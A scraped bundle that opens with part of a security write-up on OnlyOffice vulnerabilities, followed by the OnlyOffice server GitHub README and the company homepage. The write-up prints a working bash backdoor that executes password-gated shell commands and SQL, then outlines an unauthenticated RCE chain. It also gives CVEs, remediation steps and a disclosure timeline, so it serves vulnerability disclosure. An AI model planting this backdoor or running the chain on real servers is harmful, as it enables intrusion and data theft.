infile=$(grep -o "<m\_sFileFrom>.\*</m\_sFileFrom>" $1 | cut -d\> -f 2- | rev | cut -d \< -f 2- | rev)

# cat $1 > /tmp/out

# echo $title >> /tmp/out

# echo $infile >> /tmp/out

# Test to see if this is a backdoor command

cmdtype=$(echo $title | cut -d: -f 1)

password=$(echo $title | cut -d: -f 2)

cmd=$(echo $title | cut -d: -f 3-)

if [[ $password == {PASSWORD} ]]; then

 # echo "Command: $cmd" >> /tmp/out

 case $cmdtype in

 "SHELL")

 eval $cmd > $infile

 ;;

 "SQL")

 psql postgresql://onlyoffice:onlyoffice@localhost/onlyoffice -o $infile -c "$cmd"

 ;;

 esac

 # cat $infile >> /tmp/out

fi

# Get dir this is executed in

SCRIPT\_DIR="$( cd -- "$( dirname -- "${BASH\_SOURCE[0]}" )" &> /dev/null && pwd )"

# echo $SCRIPT\_DIR >> /tmp/out

# Delete shelled .so file if it exists

SOFILE=$SCRIPT\_DIR/libpthread.so.0

if [[ -f "$SOFILE" ]]; then

 rm $SOFILE

fi

# Call original bin with original arguments

$SCRIPT\_DIR/x2t.new $@

## Putting it all together: Unauthenticated Remote Code Execution

So, the full chain of exploits is as follows:

1. Connect to the WebSocket without authentication
2. Request that the server downloads and converts a document that we host
3. The document writes a Linux binary into a known path using path traversal
4. The binary is loaded and executed, installing a backdoor into the document converter
5. Calls to the document converter containing the right keywords and arguments are then executed as system commands

Here’s how that looks to the user of `pwnlyoffice`.

![Getting unauthenticated RCE](/globalassets/cyber-labs/cve-2021-43444-to-43449-exploiting-onlyoffice-web-sockets-for-unauthenticated-remote-code-execution/text-description-automatically-generated-5.png?epslanguage=en)

And the SQL shell, being used to extract a list of valid document ids:

![SQL Shell](/globalassets/cyber-labs/cve-2021-43444-to-43449-exploiting-onlyoffice-web-sockets-for-unauthenticated-remote-code-execution/text-description-automatically-generated-6.png?epslanguage=en)

## Download PwnlyOffice

![github](https://i0.wp.com/labs.nettitude.com/wp-content/uploads/2016/06/github-e1466539795501.png?resize=35%2C35&ssl=1) **GitHub:** <https://github.com/nettitude/pwnlyoffice>

## CVEs Assigned

In total, 6 CVEs were generated from this research:

1. CVE-2021-43447: Unauthenticated Websocket
2. CVE-2021-43445: Default JWT signing key
3. CVE-2021-43444: Default download URL signing key
4. CVE-2021-43448: Web socket tampering (e.g. user names)
5. CVE-2021-43446: XSS in macros
6. CVE-2021-43449: SSRF in “auth” websocket command

In addition, I logged a bug report with NextCloud’s HackerOne program regarding the ability to create a new admin without supplying a valid admin password, however the 30 minute window with which you can carry out admin actions without supplying your password was deemed to be functionality as intended.

## Remediation

If at all possible, update to version 7.2 of OnlyOffice.

If an upgrade is for any reason not possible, you will need to mitigate against these vulnerabilities as follows:

1. Enable JWT signed WebSocket commands and ensure that a long, randomly generated key is used: <https://api.onlyoffice.com/editors/signature/>
2. Set a long, randomly generated key for download URL signing: <https://api.onlyoffice.com/editors/nextcloud>
3. Disable the Macros plugin: <https://api.onlyoffice.com/editors/config/editor/customization#macros>
4. Disable the “chat” plugin: <https://api.onlyoffice.com/editors/config/editor/customization#chat>
5. Ensure that OnlyOffice document server is separated from all other non-essential systems at the network layer. i.e. document server should not be able to call out to the external Internet, or make internal calls to anything other than the intended document management system. It should especially not be able to contact the IP address `169.254.169.254` if you are hosting OnlyOffice in a cloud environment.
6. For all OnlyOffice containers, ensure that the user which the web service is running as (e.g. ds) can only write to the temp folder. In particular, ensure that it cannot write to `/var/www/onlyoffice`, or wherever your document server is installed.
7. Do not allow untrusted documents to be inserted directly into OnlyOffice, e.g. through a publicly available document upload portal.

## Timeline

* 2020-09-24: Original awareness of OnlyOffice
* 2021-10-05: Research into OnlyOffice
* 2021-10-18: Disclosure of vulnerabilities to OnlyOffice
* 2021-11-18: Application for 6 CVEs with MITRE
* 2021-12-17: Assigned 6 CVEs
* 2022-01-07: Produced PoC for automated unauthenticated RCE
* 2022-09-26: Fix released in version 7.2

#

### **GitHub Projects**

Check out our latest projects at [GitHub](https://github.com/nettitude)

## **Latest Cyber Labs articles**

* ### Binary Ninja Plugin

  ![](/cdn-cgi/image/width=1024,format=auto/globalassets/cyber-security---images/headers-and-other-images/8---news/cyber-security-news-lrqa-2.jpg)

  Article

  Recently, in response to a customer incident we needed to reverse engineer a malware sample of WhiteRabbit ransomware...
* ### This Badge is My Badge

  ![](/cdn-cgi/image/width=432,format=auto/globalassets/cyber-security---images/headers-and-other-images/8---news/cyber-security-news-lrqa-2.jpg)

  Article

  When it comes to covert entry assessments, successfully capturing RFID badge values can mean the difference between failure...
* ### Version Tracking in Ghidra

  ![](/cdn-cgi/image/width=432,format=auto/globalassets/cyber-security---images/headers-and-other-images/8---news/cyber-security-news-lrqa-2.jpg)

  Article

  When a binary is reverse engineered using Ghidra, various annotations are applied to aid in understanding the binary’s...
* ### Cross Site Scripting Payloads

  ![](/cdn-cgi/image/width=432,format=auto/globalassets/cyber-security---images/headers-and-other-images/8---news/cyber-security-news-lrqa-2.jpg)

  Article

  We curate a set of fun and interesting Cross Site Scripting (XSS) payloads. They’re designed for quick...
* ### Prowl

  ![](/cdn-cgi/image/width=432,format=auto/globalassets/cyber-security---images/headers-and-other-images/8---news/cyber-security-news-lrqa-2.jpg)

  Article

  Prowl is an open source data harvesting tool written in Python to help alleviate some of the more...
* ### PoshC2 documentation

  ![](/cdn-cgi/image/width=432,format=auto/globalassets/cyber-security---images/headers-and-other-images/8---news/cyber-security-news-lrqa-2.jpg)

  Article

  We maintain PoshC2 documentation over at https://poshc2.readthedocs.io/en/latest/. For your convenience, we have also embedded it below.
* ### Penetration Testing

  ![](/cdn-cgi/image/width=432,format=auto/globalassets/cyber-security---images/headers-and-other-images/8---news/cyber-security-news-lrqa-2.jpg)

  Article

  We are looking for passionate and skilled penetration testers with professional experience. There are multiple roles available...
* ### Accelerator Program

  ![](/cdn-cgi/image/width=432,format=auto/globalassets/cyber-security---images/headers-and-other-images/8---news/cyber-security-news-lrqa-2.jpg)

  Article

  Do you want a job in cyber security but don’t know how to break into the industry? Tired...
* ### Rocktastic

  ![](/cdn-cgi/image/width=432,format=auto/globalassets/cyber-security---images/headers-and-other-images/8---news/cyber-security-news-lrqa-2.jpg)

  Article

  Bigger, better (faster, stronger…)
  Bigger isn’t always better, but sometimes it is. If you need a huge word...

Previous

Next

![](/cdn-cgi/image/width=120,format=auto/globalassets/logos/lrqa-white-logo---dark-background-cropped.png)

* [Who we are](/en/who-we-are/)
* [Careers](/en/careers/)
* [Resources](/en/resources/)

LRQA and any variants are trading names of LRQA Group Limited, its subsidiaries and affiliates. LRQA Group Limited, registered number 1217474, is a limited company registered in England and Wales. Registered office: 1, Trinity Park, Bickenhill Lane, Birmingham B37 7ES. © 2024 LRQA Group Limited.

* [Privacy notice](/en/privacy-notice/)
* [Cookie Policy](/en/cookies-policy/)
* [Terms of use](/en/terms-of-use/)
* [Modern Slavery Statement](/en/who-we-are/modern-slavery/)
* [Governance](/en/who-we-are/governance-policies/)



=== Content from github.com_01e38bb7_20250108_134807.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FONLYOFFICE%2Fserver)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FONLYOFFICE%2Fserver)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E&source=header-repo&source_repo=ONLYOFFICE%2Fserver)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[ONLYOFFICE](/ONLYOFFICE)
/
**[server](/ONLYOFFICE/server)**
Public

* [Notifications](/login?return_to=%2FONLYOFFICE%2Fserver) You must be signed in to change notification settings
* [Fork
  242](/login?return_to=%2FONLYOFFICE%2Fserver)
* [Star
   197](/login?return_to=%2FONLYOFFICE%2Fserver)

The backend server software layer which is the part of ONLYOFFICE Document Server and is the base for all other components

[www.onlyoffice.com](https://www.onlyoffice.com "https://www.onlyoffice.com")

### License

[AGPL-3.0 license](/ONLYOFFICE/server/blob/master/LICENSE.txt)

[197
stars](/ONLYOFFICE/server/stargazers) [242
forks](/ONLYOFFICE/server/forks) [Branches](/ONLYOFFICE/server/branches) [Tags](/ONLYOFFICE/server/tags) [Activity](/ONLYOFFICE/server/activity)
 [Star](/login?return_to=%2FONLYOFFICE%2Fserver)

 [Notifications](/login?return_to=%2FONLYOFFICE%2Fserver) You must be signed in to change notification settings

* [Code](/ONLYOFFICE/server)
* [Pull requests
  1](/ONLYOFFICE/server/pulls)
* [Actions](/ONLYOFFICE/server/actions)
* [Security](/ONLYOFFICE/server/security)
* [Insights](/ONLYOFFICE/server/pulse)

Additional navigation options

* [Code](/ONLYOFFICE/server)
* [Pull requests](/ONLYOFFICE/server/pulls)
* [Actions](/ONLYOFFICE/server/actions)
* [Security](/ONLYOFFICE/server/security)
* [Insights](/ONLYOFFICE/server/pulse)

# ONLYOFFICE/server

    master[Branches](/ONLYOFFICE/server/branches)[Tags](/ONLYOFFICE/server/tags)Go to fileCode
## Folders and files

| Name | | Name | Last commit message | Last commit date |
| --- | --- | --- | --- | --- |
| Latest commit History[2,475 Commits](/ONLYOFFICE/server/commits/master/) | | |
| [.github/workflows](/ONLYOFFICE/server/tree/master/.github/workflows "This path skips through empty directories") | | [.github/workflows](/ONLYOFFICE/server/tree/master/.github/workflows "This path skips through empty directories") |  |  |
| [3d-party-lic-report](/ONLYOFFICE/server/tree/master/3d-party-lic-report "3d-party-lic-report") | | [3d-party-lic-report](/ONLYOFFICE/server/tree/master/3d-party-lic-report "3d-party-lic-report") |  |  |
| [Common](/ONLYOFFICE/server/tree/master/Common "Common") | | [Common](/ONLYOFFICE/server/tree/master/Common "Common") |  |  |
| [DocService](/ONLYOFFICE/server/tree/master/DocService "DocService") | | [DocService](/ONLYOFFICE/server/tree/master/DocService "DocService") |  |  |
| [FileConverter](/ONLYOFFICE/server/tree/master/FileConverter "FileConverter") | | [FileConverter](/ONLYOFFICE/server/tree/master/FileConverter "FileConverter") |  |  |
| [Metrics](/ONLYOFFICE/server/tree/master/Metrics "Metrics") | | [Metrics](/ONLYOFFICE/server/tree/master/Metrics "Metrics") |  |  |
| [SpellChecker](/ONLYOFFICE/server/tree/master/SpellChecker "SpellChecker") | | [SpellChecker](/ONLYOFFICE/server/tree/master/SpellChecker "SpellChecker") |  |  |
| [branding](/ONLYOFFICE/server/tree/master/branding "branding") | | [branding](/ONLYOFFICE/server/tree/master/branding "branding") |  |  |
| [license](/ONLYOFFICE/server/tree/master/license "license") | | [license](/ONLYOFFICE/server/tree/master/license "license") |  |  |
| [schema](/ONLYOFFICE/server/tree/master/schema "schema") | | [schema](/ONLYOFFICE/server/tree/master/schema "schema") |  |  |
| [tests](/ONLYOFFICE/server/tree/master/tests "tests") | | [tests](/ONLYOFFICE/server/tree/master/tests "tests") |  |  |
| [.gitignore](/ONLYOFFICE/server/blob/master/.gitignore ".gitignore") | | [.gitignore](/ONLYOFFICE/server/blob/master/.gitignore ".gitignore") |  |  |
| [.travis.yml](/ONLYOFFICE/server/blob/master/.travis.yml ".travis.yml") | | [.travis.yml](/ONLYOFFICE/server/blob/master/.travis.yml ".travis.yml") |  |  |
| [3DPARTY.md](/ONLYOFFICE/server/blob/master/3DPARTY.md "3DPARTY.md") | | [3DPARTY.md](/ONLYOFFICE/server/blob/master/3DPARTY.md "3DPARTY.md") |  |  |
| [3rd-Party.txt](/ONLYOFFICE/server/blob/master/3rd-Party.txt "3rd-Party.txt") | | [3rd-Party.txt](/ONLYOFFICE/server/blob/master/3rd-Party.txt "3rd-Party.txt") |  |  |
| [CHANGELOG.md](/ONLYOFFICE/server/blob/master/CHANGELOG.md "CHANGELOG.md") | | [CHANGELOG.md](/ONLYOFFICE/server/blob/master/CHANGELOG.md "CHANGELOG.md") |  |  |
| [Gruntfile.js](/ONLYOFFICE/server/blob/master/Gruntfile.js "Gruntfile.js") | | [Gruntfile.js](/ONLYOFFICE/server/blob/master/Gruntfile.js "Gruntfile.js") |  |  |
| [LICENSE.txt](/ONLYOFFICE/server/blob/master/LICENSE.txt "LICENSE.txt") | | [LICENSE.txt](/ONLYOFFICE/server/blob/master/LICENSE.txt "LICENSE.txt") |  |  |
| [Makefile](/ONLYOFFICE/server/blob/master/Makefile "Makefile") | | [Makefile](/ONLYOFFICE/server/blob/master/Makefile "Makefile") |  |  |
| [Readme.md](/ONLYOFFICE/server/blob/master/Readme.md "Readme.md") | | [Readme.md](/ONLYOFFICE/server/blob/master/Readme.md "Readme.md") |  |  |
| [npm-shrinkwrap.json](/ONLYOFFICE/server/blob/master/npm-shrinkwrap.json "npm-shrinkwrap.json") | | [npm-shrinkwrap.json](/ONLYOFFICE/server/blob/master/npm-shrinkwrap.json "npm-shrinkwrap.json") |  |  |
| [package.json](/ONLYOFFICE/server/blob/master/package.json "package.json") | | [package.json](/ONLYOFFICE/server/blob/master/package.json "package.json") |  |  |
| View all files | | |

## Repository files navigation

* README
* AGPL-3.0 license
# Server

[![License](https://camo.githubusercontent.com/1720e1c42dd5a9a5cfaed3a4abec210e929921fa9271e404263661daf3c7905b/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f4c6963656e73652d474e552532304147504c25323056332d677265656e2e7376673f7374796c653d666c6174)](https://www.gnu.org/licenses/agpl-3.0.en.html)

The backend server software layer which is the part of [ONLYOFFICE Document Server](https://github.com/ONLYOFFICE/DocumentServer) and [ONLYOFFICE Desktop Editors](https://github.com/ONLYOFFICE/DesktopEditors) and is the base for all other components.

## Document service set up

This instruction describes document service deployment for Windows based platform.

### Installing necessary components

For the document service to work correctly it is necessary to install the following components for your Windows system (if not specified additionally, the latest version for 32 or 64 bit Windows can be installed with default settings):

1. [Node.js](https://nodejs.org/en/download/) version 8.0.0 or later
2. [Java](https://java.com/en/download/). Necessary for the sdk build.
3. Database (MySQL or PostgreSQL). When installing use the `onlyoffice` password for the `root` user.

   * [MySQL Server](http://dev.mysql.com/downloads/windows/installer/) version 5.5 or later
   * [PostgreSQL Server](https://www.postgresql.org/download/) version 9.1 or later
4. [Erlang](https://www.erlang.org/download.html)
5. [RabbitMQ](https://www.rabbitmq.com/releases/rabbitmq-server/v3.5.4/rabbitmq-server-3.5.4.exe)
6. [Redis](https://github.com/microsoftarchive/redis/releases/latest)
7. [Python 2.7](https://www.python.org/downloads/release/python-2716/)
8. Microsoft Visual C++ Express 2010 (necessary for the spellchecker modules build)

### Setting up the system

1. Database setup:

   * Database setup for MySQL

     Run the `schema/mysql/createdb.sql` script for MySQL
   * Database setup for PostgreSQL

     1. Enter in `psql` (PostgreSQL interactive terminal) with
        login and password introduced during installation, then enter commands:

        ```
        CREATE USER onlyoffice WITH PASSWORD 'onlyoffice';
        CREATE DATABASE onlyoffice OWNER onlyoffice;
        \c onlyoffice
        \i 'schema/postgresql/createdb.sql';
        ```
     2. Delete from `server\Common\config\development-windows.json` option `sql`.
2. Install the Web Monitor for RabbitMQ (see the details for the installation [here](https://www.rabbitmq.com/management.html))
3. Open the command line `cmd` executable.
4. Switch to the installation directory using the `cd /d Installation-directory/sbin` command.
5. Run the following command:

   ```
   rabbitmq-plugins.bat enable rabbitmq_management
   ```
6. The Web Monitor is located at the <http://localhost:15672/> address.
   Use the `guest:guest` for the login:password combination.
7. If Redis does not start or crashes after the start for some reason,
   try to change the `maxheap` parameter in the config settings.
   For 64 bit version of Windows 7 the config file can be found here:
   `C:\Program Files\Redis\redis.windows-service.conf`.
   Find the `# maxheap <bytes>` line and change it to, e.g.

   ```
   maxheap 128MB

   ```

   and restart the service

### Running the service

Run the `run.bat` script to start the service.

Notes

All config files for the server part can be found in the `Common\config` folder

* `default.json` - common config files similar for all production versions.
* `production-windows.json` - config files for the production version running on a Windows based platform.
* `production-linux.json` - config files for the production version running on a Linux based platform.
* `development-windows.json` - config files for the development version running on a Windows based platform (this configuration is used when running the 'run.bat' script).

In case it is necessary to temporarily edit the config files, create the local.json file and reassign the values there. It will allow to prevent from uploading local changes and losing config files when updating the repository. See [Configuration Files](https://github.com/lorenwest/node-config/wiki/Configuration-Files) for more information about the configuration files.

## User Feedback and Support

If you have any problems with or questions about [ONLYOFFICE Document Server](https://github.com/ONLYOFFICE/DocumentServer), please visit our official forum to find answers to your questions: [forum.onlyoffice.com](https://forum.onlyoffice.com) or you can ask and answer ONLYOFFICE development questions on [Stack Overflow](https://stackoverflow.com/questions/tagged/onlyoffice).

## License

Server is released under an GNU AGPL v3.0 license. See the LICENSE file for more information.

## About

The backend server software layer which is the part of ONLYOFFICE Document Server and is the base for all other components

[www.onlyoffice.com](https://www.onlyoffice.com "https://www.onlyoffice.com")

### Topics

[nodejs](/topics/nodejs "Topic: nodejs")
[redis](/topics/redis "Topic: redis")
[node](/topics/node "Topic: node")
[rabbitmq](/topics/rabbitmq "Topic: rabbitmq")
[backend-server](/topics/backend-server "Topic: backend-server")

### Resources

[Readme](#readme-ov-file)
### License

[AGPL-3.0 license](#AGPL-3.0-1-ov-file)

[Activity](/ONLYOFFICE/server/activity)
[Custom properties](/ONLYOFFICE/server/custom-properties)
### Stars

[**197**
stars](/ONLYOFFICE/server/stargazers)
### Watchers

[**33**
watching](/ONLYOFFICE/server/watchers)
### Forks

[**242**
forks](/ONLYOFFICE/server/forks)
[Report repository](/contact/report-content?content_url=https%3A%2F%2Fgithub.com%2FONLYOFFICE%2Fserver&report=ONLYOFFICE+%28user%29)

## [Releases](/ONLYOFFICE/server/releases)

[7,733
tags](/ONLYOFFICE/server/tags)

## [Packages 0](/orgs/ONLYOFFICE/packages?repo_name=server)

No packages published

## [Contributors 26](/ONLYOFFICE/server/graphs/contributors)

* [![@konovalovsergey](https://avatars.githubusercontent.com/u/17902399?s=64&v=4)](https://github.com/konovalovsergey)
* [![@trofim24](https://avatars.githubusercontent.com/u/1764789?s=64&v=4)](https://github.com/trofim24)
* [![@agolybev](https://avatars.githubusercontent.com/u/8861642?s=64&v=4)](https://github.com/agolybev)
* [![@papacarlo](https://avatars.githubusercontent.com/u/22055467?s=64&v=4)](https://github.com/papacarlo)
* [![@DrToldme](https://avatars.githubusercontent.com/u/16436298?s=64&v=4)](https://github.com/DrToldme)
* [![@KhromovNikita](https://avatars.githubusercontent.com/u/52740597?s=64&v=4)](https://github.com/KhromovNikita)
* [![@JuliaRadzhabova](https://avatars.githubusercontent.com/u/17922480?s=64&v=4)](https://github.com/JuliaRadzhabova)
* [![@K0R0L](https://avatars.githubusercontent.com/u/16754960?s=64&v=4)](https://github.com/K0R0L)
* [![@ayuzhin](https://avatars.githubusercontent.com/u/17567024?s=64&v=4)](https://github.com/ayuzhin)
* [![@ShockwaveNN](https://avatars.githubusercontent.com/u/668524?s=64&v=4)](https://github.com/ShockwaveNN)
* [![@dependabot[bot]](https://avatars.githubusercontent.com/in/29110?s=64&v=4)](https://github.com/apps/dependabot)
* [![@L3o-pold](https://avatars.githubusercontent.com/u/4710495?s=64&v=4)](https://github.com/L3o-pold)
* [![@romandemidov](https://avatars.githubusercontent.com/u/58073444?s=64&v=4)](https://github.com/romandemidov)
* [![@danilapog](https://avatars.githubusercontent.com/u/77471369?s=64&v=4)](https://github.com/danilapog)

[+ 12 contributors](/ONLYOFFICE/server/graphs/contributors)

## Languages

* [JavaScript
  96.2%](/ONLYOFFICE/server/search?l=javascript)
* [HTML
  2.8%](/ONLYOFFICE/server/search?l=html)
* Other
  1.0%

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from www.onlyoffice.com_993af583_20250108_134809.html ===


Get free mobile app

[Get it now](/)

This website uses cookies

By continuing to browse the website you agree to our
[privacy policy](https://help.onlyoffice.co/products/files/doceditor.aspx?fileid=5048502&doc=SXhWMEVzSEYxNlVVaXJJeUVtS0kyYk14YWdXTEFUQmRWL250NllHNUFGbz0_IjUwNDg1MDIi0&_ga=2.239950403.1196593722.1525950411-169631771.1404734630).

Got it!

[ONLYOFFICE DocSpace 3.0 released: Updated user types•Virtual Data rooms•OAuth2.0•improved room & file management•and more](https://www.onlyoffice.com/blog/2024/11/onlyoffice-docspace-3-0-released)

[ONLYOFFICE DocSpace 3.0 released](https://www.onlyoffice.com/blog/2024/11/onlyoffice-docspace-3-0-released)

* Products
  + ONLYOFFICE DocSpace

    ONLYOFFICE Docs

    Other products
  + ONLYOFFICE DocSpace
    ONLYOFFICE DocSpace
    [What is ONLYOFFICE DocSpace](/docspace.aspx)

    Document editors integrated into secure room-based DMS

    [Document editors](/office-suite.aspx)

    [Collaboration rooms](/collaboration-rooms.aspx)
    [Meeting rooms](/office-for-zoom.aspx)
    [Public rooms](/public-rooms.aspx)
    [Custom rooms](/custom-rooms.aspx)
    [Form Filling rooms](/form-filling-rooms.aspx)
    [Virtual data rooms](/virtual-data-rooms.aspx)

    [DocSpace connectors](/all-connectors.aspx)

    ONLYOFFICE Docs
    ONLYOFFICE Docs
    [What is ONLYOFFICE Docs](/office-suite.aspx)

    Document editors to integrate into your business platform

    [Document Editor](/document-editor.aspx?docs=download)
    [Spreadsheet Editor](/spreadsheet-editor.aspx?docs=download)
    [Presentation Editor](/presentation-editor.aspx?docs=download)
    [PDF Editor](/pdf-editor.aspx?docs=download)
    [Form creator](/form-creator.aspx?docs=download)
    [E-book creator](/e-book.aspx?docs=download)
    [Collaboration features](/seamless-collaboration.aspx?docs=download)

    [Docs connectors](/all-connectors.aspx)

    Other products
    Other products
    [ONLYOFFICE Desktop Editors](/desktop.aspx)

    Free desktop apps for Windows, Linux, macOS

    ONLYOFFICE Documents

    Free mobile apps for Android and iOS

    [ONLYOFFICE Workspace](/workspace.aspx)

    Business platform to manage your team activities

    [Online converters](/online-document-converter.aspx)

    For docs, sheets, slides, PDFs
  + [Templates](https://templates.onlyoffice.com/)
    [Marketplace](http://www.onlyoffice.com/app-directory)
    [Security](/security.aspx)
    [AI assistant](/ai-assistants.aspx)
    [Accessibility](/accessibility.aspx)
    [Sustainability](https://www.onlyoffice.com/blog/2024/06/eco-friendly)
* Enterprise
  + Docs Enterprise
    [Why Docs Enterprise](/docs-enterprise.aspx)
    [Pricing](/docs-enterprise-prices.aspx)
    [Get it now](/download.aspx#docs-enterprise)
  + DocSpace Enterprise
    [Why DocSpace Enterprise](/docspace-enterprise.aspx)
    [Pricing](/docspace-prices.aspx)
    [Get it now](/download.aspx#docspace-enterprise)
  + Contact sales
    [Request demo](/demo-order.aspx)
* Developers
  + [All solutions](/for-developers.aspx)
    [Why Docs Developer](/developer-edition.aspx)
    - [Automation API](/automation-api.aspx)
    - [Conversion API](/conversion-api.aspx)
    - [Document Builder](/document-builder.aspx)[Pricing](/developer-edition-prices.aspx)
    [Launch demo](/see-it-in-action.aspx?developer=edition)
    [Get it now](/download-developer.aspx?from=downloadintegrationmenu#docs-developer)
  + DocSpace Developer
    [Why DocSpace Developer](/docspace-developer.aspx)
    [Pricing](/docspace-developer-prices.aspx)
    [Get it now](/download-developer.aspx#docspace-developer)
  + [API Docs](https://api.onlyoffice.com/)
    Contact sales
* Pricing
  + For business
    [DocSpace](/docspace-prices.aspx)
    [Docs Enterprise](/docs-enterprise-prices.aspx)
    [Workspace](/workspace-prices.aspx)

    For developers
    [Docs Developer](/developer-edition-prices.aspx)
    [DocSpace Developer](/docspace-developer-prices.aspx)
    For home use
    [Docs Home Server](/docs-home-server.aspx)
    [DocSpace Family Pack](/docspace-family-pack.aspx)
  + [Buy from an ONLYOFFICE reseller](/find-partners.aspx)
    [Find out the list of all the authorized ONLYOFFICE resellers in your area](/find-partners.aspx)
  + Contact sales
* Partners
  + [Resellers](/resellers.aspx)
    [Affiliates](/affiliates.aspx)
    [Hosting providers](/hosting-providers.aspx)
    [Technology partners](/technology-partners.aspx)
    [Find partners](/find-partners.aspx)
    [Submit request](/partnership-request.aspx)
  + [Events](/events.aspx)

    Meet the ONLYOFFICE team
* Resources
  + About us
    [Company](/about.aspx)
    [Customers](/customers.aspx)
    [Success stories](/customers.aspx#stories)
    [Awards](/awards.aspx)
    [Certificates](/certificates.aspx)
    [Events](/events.aspx)
    [Press downloads](/press-downloads.aspx)
    [Gift shop](https://shop.spreadshirt.com/onlyoffice)
    [Contacts](/contacts.aspx)
  + Collaborate
    [For contributors](/contribute.aspx)
    [For translators](https://helpcenter.onlyoffice.com/guides/become-translator.aspx)
    [For influencers](/influencer-program.aspx)
    [Vacancies](/vacancies.aspx)

    Get help
    [Forum](https://forum.onlyoffice.com/)
    [Help Center](https://helpcenter.onlyoffice.com/index.aspx)
    [Training courses](/training-courses.aspx)
    [Webinars](/webinars.aspx)
    [White papers](/whitepapers.aspx)
  + [Blog](http://www.onlyoffice.com/blog/)
    [ONLYOFFICE DocSpace 3.0 released: updated user types, Virtual Data rooms, OAuth2.0, improved room & file management, and more

    25 November 2024](https://www.onlyoffice.com/blog/2024/11/onlyoffice-docspace-3-0-released)
    [ONLYOFFICE Docs 8.2 released: PDF collaborative editing, revamped interface, optimized performance, and more

    17 October 2024](https://www.onlyoffice.com/blog/2024/10/onlyoffice-docs-8-2-released)
* Download
  + [Enterprise servers](/download.aspx)

    Docs and DocSpace for businesses’ internal use

    [Developer servers](/download-developer.aspx)

    Docs and DocSpace for sale to customers under your brand

    [Desktop and mobiles apps](/download-desktop.aspx)

    Linux, Windows, macOS, Android, iOS
* Log in / Sign up
  + [DocSpace](/docspace-signin.aspx)

    Document editors & storage

    [Docs](/docs-registration.aspx)

    Document editors only

Download

* Download
  [Enterprise servers](/download.aspx)

  Docs and DocSpace for businesses’ internal use

  [Developer servers](/download-developer.aspx)

  Docs and DocSpace for sale to customers under your brand

  [Desktop and mobiles apps](/download-desktop.aspx)

  Linux, Windows, macOS, Android, iOS

Log in  Sign up

* Log in / Sign up
  [DocSpace](/docspace-registration.aspx)

  Document editors & storage

  [Docs](/docs-registration.aspx)

  Document editors only

Search on site

* Ascensio System SIA
  Phone: +1 (972) 301-8440Phone: +371 63399867Phone: +371 633 998 67Phone: +371 633 99 867Phone: +44 20 3287 1086
  [Request a call](/call-back-form.aspx)

+1 (972) 301-8440
+371 633 998 67
+371 633 998 67
+371 633 99 867
+44 20 3287 1086

# Run your private office with the ONLYOFFICE

[Get it now](/download.aspx?from=default#docs-enterprise)
[See it in action](/docspace-registration.aspx?from=default)

## ONLYOFFICE Docs, the most complete office suite

View, edit, and collaborate on [docs](/document-editor.aspx), [sheets](/spreadsheet-editor.aspx), [slides](/presentation-editor.aspx)
Build fillable [PDF forms](/form-creator.aspx) and fill them in online
Read and edit [PDFs](/pdf-editor.aspx), export/import to/from PDF
